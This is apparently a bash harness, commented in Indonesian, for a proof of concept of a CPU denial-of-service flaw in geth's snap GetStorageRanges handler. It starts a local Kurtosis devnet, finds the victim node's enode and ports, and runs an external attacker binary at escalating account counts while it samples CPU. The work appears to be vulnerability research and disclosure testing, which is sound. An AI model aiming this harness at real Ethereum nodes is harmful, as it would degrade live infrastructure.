#!/usr/bin/env bash
# Runner PoC Kurtosis untuk EF K1 snap (GetStorageRanges CPU DoS).
#
# Alur: jalankan devnet Kurtosis (1 partisipan geth+lighthouse) -> tunggu
# target blok -> resolve RPC + port p2p + enode victim -> unduh genesis EL
# -> baseline CPU idle -> serangan attacker (kontrol + utama 100k, 2 run)
# -> kumpulkan log/artefak.
#
# Dipakai oleh workflow GitHub Actions (.github/workflows/kurtosis-poc.yml),
# tapi bisa juga jalan mandiri di mesin Linux yang sudah punya docker +
# kurtosis + go (untuk dry-run logika; tetap butuh resource ~16 GB).
#
# Penggunaan:
#   ./run-kurtosis-poc.sh [full|smoke] [target-blocks]
#   ./run-kurtosis-poc.sh full 130    # default: 130 blok + serangan penuh
#   ./run-kurtosis-poc.sh smoke 10    # uji pipa: 10 blok + 10 akun
#
# Env yang dipakai (di-set workflow; ada default di bawah):
#   ENCLAVE (default snap-k1-poc), PACKAGE_REF
#   (default github.com/ethpandaops/ethereum-package@6.1.0),
#   ARGS_FILE (default network-params.yaml),
#   ATTACKER (default ./snap-attacker), RESULTS_DIR (default poc-results)
#
# Keluaran: poc-results/results-<mode>-<timestamp>.txt,
# poc-results/logs/ (victim + attack mentah), poc-results/genesis.json,
# dan log console script ini (dialihkan workflow ke kurtosis-poc.log).
#
# !!! BACA RESEARCH.md RISIKO #1 SEBELUM MENJALANKAN DI REPO PUBLIK !!!
set -u
# pipefail: tanpa ini, `kurtosis run ... | tee` selalu lapor rc=0 (rc-nya tee),
# sehingga kegagalan kurtosis run (mis. error Starlark run #1) baru ketahuan
# belakangan di port print. Dengan pipefail, rc pipeline = rc kurtosis.
set -o pipefail
cd "$(dirname "$0")"

MODE="${1:-full}"
TARGET_BLOCKS="${2:-130}"
ENCLAVE="${ENCLAVE:-snap-k1-poc}"
PACKAGE_REF="${PACKAGE_REF:-github.com/ethpandaops/ethereum-package@6.1.0}"
ARGS_FILE="${ARGS_FILE:-network-params.yaml}"
ATTACKER="${ATTACKER:-./snap-attacker}"
RESULTS_DIR="${RESULTS_DIR:-poc-results}"
EL_SERVICE="el-1-geth-lighthouse"

if [ "$MODE" = "smoke" ]; then TARGET_BLOCKS=10; fi

mkdir -p "$RESULTS_DIR/logs"
TS="$(date +%Y%m%d-%H%M%S)"
RESULTS="$RESULTS_DIR/results-${MODE}-${TS}.txt"
: > "$RESULTS"

log() { echo "[$(date +%H:%M:%S)] $*" | tee -a "$RESULTS"; }
die() { log "FATAL: $*"; exit 1; }

rpc() { # rpc <url> <method> [json-params]
  curl -s -X POST "$1" -H 'Content-Type: application/json' \
    -d "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"$2\",\"params\":${3:-[]}}"
}
block_number() { # block_number <rpc-url> -> desimal
  rpc "$1" eth_blockNumber | python3 -c 'import json,sys; print(int(json.load(sys.stdin)["result"],16))'
}
port_of() { # port_of <kurtosis-port-print-output> -> nomor port host
  # Output bisa "http://127.0.0.1:32769" atau "127.0.0.1:32769".
  echo "$1" | sed -e 's#^http://##' -e 's#^https://##' | awk -F: '{print $NF}'
}

log "POC-KURTOSIS mode=$MODE targetBlocks=$TARGET_BLOCKS enclave=$ENCLAVE package=$PACKAGE_REF"
log "kurtosis version: $(kurtosis version 2>&1 | tr '\n' ' ')"
log "docker: $(docker --version)"
log "disk awal:"; df -h | tee -a "$RESULTS"
command -v "$ATTACKER" >/dev/null 2>&1 || [ -x "$ATTACKER" ] || die "attacker tidak ditemukan: $ATTACKER (build dulu)"
[ -f "$ARGS_FILE" ] || die "args file tidak ditemukan: $ARGS_FILE"
grep -q "poc-snap-geth:b05eff09" "$ARGS_FILE" || die "args file tidak memakai image geth kustom b05eff09"
docker image inspect poc-snap-geth:b05eff09 >/dev/null 2>&1 || die "image poc-snap-geth:b05eff09 belum di-build"

# --- 1. jalankan devnet -------------------------------------------------------
log "menjalankan devnet: kurtosis run --enclave $ENCLAVE $PACKAGE_REF"
kurtosis run --enclave "$ENCLAVE" "$PACKAGE_REF" \
  --args-file "$ARGS_FILE" --image-download missing 2>&1 | tee -a "$RESULTS"
KURTOSIS_RC="${PIPESTATUS[0]}"
log "kurtosis run selesai (rc=$KURTOSIS_RC)"
[ "$KURTOSIS_RC" -eq 0 ] || die "kurtosis run gagal (rc=$KURTOSIS_RC) — lihat error Starlark di atas (mis. validasi fork/validator)"

log "service di enclave:"
kurtosis enclave inspect "$ENCLAVE" 2>&1 | tee -a "$RESULTS"
# Fail cepat bila service EL tidak ada (mis. kurtosis run gagal validasi
# Starlark — enclave kosong). Jangan lanjut ke port print yang pasti gagal.
kurtosis enclave inspect "$ENCLAVE" 2>/dev/null | grep -q "$EL_SERVICE" \
  || die "service EL $EL_SERVICE tidak ada di enclave — kurtosis run gagal (cek error Starlark di atas)"
# Fail bila ada service tambahan yang tidak diminta (spammer/monitoring
# akan mengotori pengukuran CPU — lihat RESEARCH.md risiko #9).
UNEXPECTED="$(kurtosis enclave inspect "$ENCLAVE" 2>/dev/null | grep -E 'spamoor|tx-fuzz|grafana|prometheus|dora|assertoor|mev-boost' || true)"
if [ -n "$UNEXPECTED" ]; then
  log "PERINGATAN: service tambahan terdeteksi (akan mengotori CPU baseline):"
  echo "$UNEXPECTED" | tee -a "$RESULTS"
fi

# --- 2. resolve RPC + port p2p ------------------------------------------------
RPC_URL="$(kurtosis port print "$ENCLAVE" "$EL_SERVICE" rpc 2>/dev/null || true)"
[ -n "$RPC_URL" ] || die "kurtosis port print rpc gagal untuk $EL_SERVICE (cek nama service/port di 'kurtosis enclave inspect')"
# Normalisasi ke http://127.0.0.1:<port>
RPC_PORT="$(port_of "$RPC_URL")"
RPC="http://127.0.0.1:${RPC_PORT}"
log "victim RPC: $RPC (dari $RPC_URL)"

P2P_RAW="$(kurtosis port print "$ENCLAVE" "$EL_SERVICE" tcp-discovery 2>/dev/null || true)"
[ -n "$P2P_RAW" ] || die "kurtosis port print tcp-discovery gagal untuk $EL_SERVICE"
P2P_PORT="$(port_of "$P2P_RAW")"
log "victim p2p host port: $P2P_PORT (dari $P2P_RAW)"

# Tunggu RPC merespons (EL sudah up, CL mungkin masih sync).
log "menunggu RPC merespons..."
for i in $(seq 1 120); do
  if rpc "$RPC" eth_blockNumber >/dev/null 2>&1; then break; fi
  sleep 5
done
rpc "$RPC" eth_blockNumber >/dev/null 2>&1 || die "victim RPC tidak merespons setelah 10 menit"
log "victim RPC up; genesis=$(rpc "$RPC" eth_getBlockByNumber '["0x0",false]' | python3 -c 'import json,sys; print(json.load(sys.stdin)["result"]["hash"])')"
log "chainId=$(rpc "$RPC" eth_chainId)"

# --- 3. enode victim (utama: admin_nodeInfo; fallback: service logs) ---------
ENODE="$(rpc "$RPC" admin_nodeInfo | python3 -c 'import json,sys; print(json.load(sys.stdin)["result"]["enode"])' 2>/dev/null || true)"
if [ -z "$ENODE" ]; then
  log "admin_nodeInfo tidak tersedia — fallback: grep enode dari service logs"
  kurtosis service logs "$ENCLAVE" "$EL_SERVICE" > "$RESULTS_DIR/logs/victim-early.log" 2>&1 || true
  ENODE="$(grep -o 'enode://[0-9a-f]*@[0-9.]*:[0-9]*' "$RESULTS_DIR/logs/victim-early.log" | head -1 || true)"
fi
[ -n "$ENODE" ] || die "tidak bisa mendapatkan enode victim (admin_nodeInfo gagal DAN tidak ada di logs)"
log "victim enode: $ENODE"

# --- 4. unduh genesis EL (untuk fork ID attacker) -----------------------------
log "mengunduh genesis EL: kurtosis files download $ENCLAVE el-genesis-data"
rm -rf "$RESULTS_DIR/genesis-download"
kurtosis files download "$ENCLAVE" el-genesis-data "$RESULTS_DIR/genesis-download" 2>&1 | tee -a "$RESULTS"
GENESIS_JSON="$(find "$RESULTS_DIR/genesis-download" -name 'genesis.json' | head -1 || true)"
[ -n "$GENESIS_JSON" ] || die "genesis.json tidak ditemukan di artefak el-genesis-data (isi: $(ls -R "$RESULTS_DIR/genesis-download" | head -20))"
cp "$GENESIS_JSON" "$RESULTS_DIR/genesis.json"
python3 -c "
import json
g = json.load(open('$RESULTS_DIR/genesis.json'))
print('genesis config chainId:', g['config'].get('chainId'))
print('genesis config fork times:', {k: v for k, v in g['config'].items() if 'Time' in k})
" | tee -a "$RESULTS"

# --- 5. resolve container EL + PID geth (untuk sampling CPU) ------------------
EL_UUID="$(kurtosis service inspect "$ENCLAVE" "$EL_SERVICE" --full-uuid 2>/dev/null | grep -oE '[0-9a-f]{32,}' | head -1 || true)"
log "EL service UUID: ${EL_UUID:-<tidak ketemu>}"
EL_CID=""
if [ -n "$EL_UUID" ]; then
  EL_CID="$(docker ps -q --filter "name=${EL_UUID:0:12}" | head -1 || true)"
fi
if [ -z "$EL_CID" ]; then
  # Fallback: cari container dari image geth kustom.
  EL_CID="$(docker ps -q --filter "ancestor=poc-snap-geth:b05eff09" | head -1 || true)"
fi
[ -n "$EL_CID" ] || die "container EL tidak ditemukan via docker ps (UUID: $EL_UUID)"
log "EL container ID: $EL_CID"
GETH_PID="$(docker exec "$EL_CID" pgrep -x geth 2>/dev/null | head -1 || true)"
[ -n "$GETH_PID" ] || die "PID geth tidak ditemukan di dalam container EL"
log "geth PID di container: $GETH_PID"
cpu() { python3 cpu_docker.py "$EL_CID" "$GETH_PID"; } # "<cpu_seconds> <rss_mib>"

# --- 6. tunggu target blok ------------------------------------------------------
log "menunggu chain mencapai blok $TARGET_BLOCKS (timeout 60 menit)..."
DEADLINE=$(( $(date +%s) + 3600 ))
LAST=-1
while true; do
  BN="$(block_number "$RPC" 2>/dev/null || echo -1)"
  if [ "$BN" -ge "$TARGET_BLOCKS" ]; then break; fi
  if [ "$(date +%s)" -gt "$DEADLINE" ]; then
    die "timeout menunggu blok $TARGET_BLOCKS (terakhir: $BN)"
  fi
  if [ "$BN" -ne "$LAST" ] && [ "$((BN % 10))" -eq 0 ]; then
    log "blok saat ini: $BN / $TARGET_BLOCKS"; LAST="$BN"
  fi
  sleep 10
done
log "mencapai blok $TARGET_BLOCKS; head=$(rpc "$RPC" eth_getBlockByNumber '["latest",false]' | python3 -c 'import json,sys; r=json.load(sys.stdin)["result"]; print(r["number"], r["stateRoot"])')"
log "victim cpu/rss setelah sync: $(cpu)"
sleep 5 # jeda settle sebelum baseline

# --- 7. baseline idle -----------------------------------------------------------
B0="$(cpu)"; sleep 10; B1="$(cpu)"
log "BASELINE idle 10s: cpu $B0 -> $B1 (block $(block_number "$RPC") -> $(block_number "$RPC"))"

# --- 8. serangan -----------------------------------------------------------------
run_attack() { # run_attack <name> <attacker args...>
  local name="$1"; shift
  local b0 b1 t0 t1 rc blk_before blk_after
  blk_before="$(block_number "$RPC")"
  b0="$(cpu)"
  t0="$(date +%s.%N)"
  "$ATTACKER" -rpc "$RPC" -port "$P2P_PORT" -enode "$ENODE" \
    -genesis-file "$RESULTS_DIR/genesis.json" "$@" \
    > "$RESULTS_DIR/logs/attack-${name}.log" 2>&1
  rc=$?
  t1="$(date +%s.%N)"
  b1="$(cpu)"
  blk_after="$(block_number "$RPC")"
  log "ATTACK $name rc=$rc block $blk_before->$blk_after cpu $b0 -> $b1 wall=$(echo "$t1 $t0" | awk '{printf "%.3f", $1-$2}')s"
  sed 's/^/    /' "$RESULTS_DIR/logs/attack-${name}.log" | tee -a "$RESULTS"
  if [ "$rc" -ne 0 ]; then log "ATTACK $name FAILED (lihat $RESULTS_DIR/logs/attack-${name}.log)"; fi
}

if [ "$MODE" = "smoke" ]; then
  run_attack smoke-10-bogus -accounts 10 -mode bogus
else
  run_attack ctrl-10-bogus     -accounts 10     -mode bogus
  run_attack ctrl-1000-bogus   -accounts 1000   -mode bogus
  run_attack main-10k-bogus    -accounts 10000  -mode bogus
  run_attack main-100k-bogus-r1 -accounts 100000 -mode bogus
  run_attack main-100k-bogus-r2 -accounts 100000 -mode bogus
fi

log "final victim cpu/rss: $(cpu); final block: $(block_number "$RPC")"

# --- 9. log victim + (best effort) jumlah diff layer ----------------------------
log "mengambil log victim..."
kurtosis service logs "$ENCLAVE" "$EL_SERVICE" > "$RESULTS_DIR/logs/victim.log" 2>&1 || true
log "menghentikan service EL untuk memicu baris 'Persisting dirty state ... layers=N'..."
kurtosis service stop "$ENCLAVE" "$EL_SERVICE" 2>&1 | tee -a "$RESULTS" || true
sleep 5
kurtosis service logs "$ENCLAVE" "$EL_SERVICE" > "$RESULTS_DIR/logs/victim-after-stop.log" 2>&1 || true
grep -h "Persisting dirty state" "$RESULTS_DIR/logs/victim-after-stop.log" "$RESULTS_DIR/logs/victim.log" 2>/dev/null | tail -3 | tee -a "$RESULTS" || \
  log "CATATAN: baris layers=N tidak ditemukan di log (verifikasi manual — lihat RESEARCH.md §2.3.2)"
log "RESULTS FILE: $RESULTS"
log "SELESAI"
